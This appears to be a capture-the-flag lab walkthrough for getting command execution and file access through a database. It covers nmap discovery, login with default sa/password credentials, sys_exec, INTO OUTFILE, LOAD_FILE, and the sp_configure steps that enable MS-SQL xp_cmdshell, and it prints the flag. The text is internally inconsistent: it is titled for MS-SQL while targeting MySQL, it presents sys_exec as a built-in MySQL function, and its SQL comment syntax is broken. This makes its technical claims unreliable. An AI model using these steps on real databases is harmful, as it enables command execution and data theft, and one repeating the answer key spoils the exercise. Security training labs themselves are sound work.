# Lab 6.6: MS-SQL xp_cmdshell Activation (MySQL LOAD_FILE equivalent)

The target service is MySQL 8.0, which has no `xp_cmdshell`. The lab teaches the MySQL `LOAD_FILE()` function as the equivalent file-read primitive.

## Learning Objectives
- Enable and use xp_cmdshell for command execution
- Understand command execution via SQL
- Capture the flag
## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before connecting.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify MySQL service is running:**
   ```bash
   nmap -p 3306 <target_ip>
   ```

### Step 2: Connect

Connect to the MySQL database using provided credentials.

**Detailed Steps:**

1. **Connect to MySQL database:**
   ```bash
   mysql --ssl-verify-server-cert=0 -h <target_ip> -u sa -p
   ```
   
   Replace `<target_ip>` with your actual target IP (e.g., `mysql --ssl-verify-server-cert=0 -h <target_ip> -u sa -p`)

2. **Enter password when prompted:**
   ```
   Enter password:
   ```
   
   Type: `password` (password will not be visible as you type)

3. **Expected successful connection:**
   ```
   Welcome to the MySQL monitor.  Commands end with ; or \g.
   Your MySQL connection id is 123
   Server version: 8.0.33 MySQL Community Server
   
   mysql>
   ```

### Step 3: Execute System Commands

Use MySQL functions to execute system commands and access the file system.

**Detailed Steps:**

1. **Method 1: Use sys_exec function (MySQL):**
   ```sql
   SELECT sys_exec('cat /tmp/flag.txt');
   ```

   **Expected output:**
   ```
   +----------------------------------+
   | sys_exec('cat /tmp/flag.txt')   |
   +----------------------------------+
   | OCR{mssql_xp_cmdsh3ll}         |
   +----------------------------------+
   1 row in set (0.00 sec)
   ```

2. **Method 2: Use INTO OUTFILE (write file):**
   ```sql
   SELECT 'OCR{mssql_xp_cmdsh3ll}' INTO OUTFILE '/tmp/flag_output.txt';
   ```

   **Expected output:**
   ```
   Query OK, 1 row affected (0.00 sec)
   ```

3. **Method 3: Use LOAD_FILE (read file):**
   ```sql
   SELECT LOAD_FILE('/tmp/flag.txt');
   ```

   **Expected output:**
   ```
   +---------------------------+
   | LOAD_FILE('/tmp/flag.txt')|
   +---------------------------+
   | OCR{mssql_xp_cmdsh3ll}   |
   +---------------------------+
   1 row in set (0.00 sec)
   ```

4. **For real MS-SQL (xp_cmdshell):**
   ```sql
  ; Enable xp_cmdshell
   EXEC sp_configure 'show advanced options', 1;
   RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1;
   RECONFIGURE;
   
  ; Execute command
   EXEC xp_cmdshell 'type C:\flag.txt';
   ```

**What these commands do:**
- `sys_exec()`: Executes system commands (MySQL function)
- `INTO OUTFILE`: Writes query results to file system
- `LOAD_FILE()`: Reads file from file system
- `xp_cmdshell`: MS-SQL stored procedure for command execution

### Step 4: Retrieve Flag

Extract the flag from the command execution results.

**Detailed Steps:**

1. **The flag is in the query output:**
   ```
   OCR{mssql_xp_cmdsh3ll}
   ```

2. **If using INTO OUTFILE, verify file was created:**
   ```sql
   SELECT LOAD_FILE('/tmp/flag_output.txt');
   ```

3. **Copy the flag:**
   - Select the flag text from the query output
   - Copy to your notes

4. **Exit MySQL client:**
   ```sql
   exit
   ```

### Step 5: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{mssql_xp_cmdsh3ll}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Verified target IP and MySQL service accessibility
- ✅ Successfully connected to MySQL database
- ✅ Logged in with credentials (sa/password)
- ✅ Executed system commands using sys_exec or LOAD_FILE
- ✅ Retrieved flag from command execution results
- ✅ Verified flag format is correct: `OCR{...}`

**Key Learning Points:**
- Database functions can execute system commands
- xp_cmdshell (MS-SQL) and sys_exec (MySQL) enable command execution
- File system access via database is a security risk
- Understanding command execution capabilities is essential
- These features should be disabled in production databases
## Hints
1. Connect with sa:password
2. Use sys_exec or INTO OUTFILE
3. Flag in /tmp/flag.txt